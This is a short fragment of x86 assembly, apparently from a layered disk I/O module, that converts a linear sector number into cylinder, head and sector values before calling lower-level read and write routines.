			call	level0_read

			ret

level1_write:		call	level1_rw

			call	level0_write

			ret

level1_rw:		push	level1_ptr
			pop	level0_ptr

			mov	ax, level1_count
			mov	level0_count, ax

			mov	eax, level1_sector
			cdq
			movzx	ecx, level0_max_sector
			div	ecx
			inc	dx
			mov	level0_sector, dx
			xor	edx, edx
			movzx	ecx, level0_max_head
			div	ecx
			mov	level0_head, dx
			mov	level0_cylinder, ax

			ret

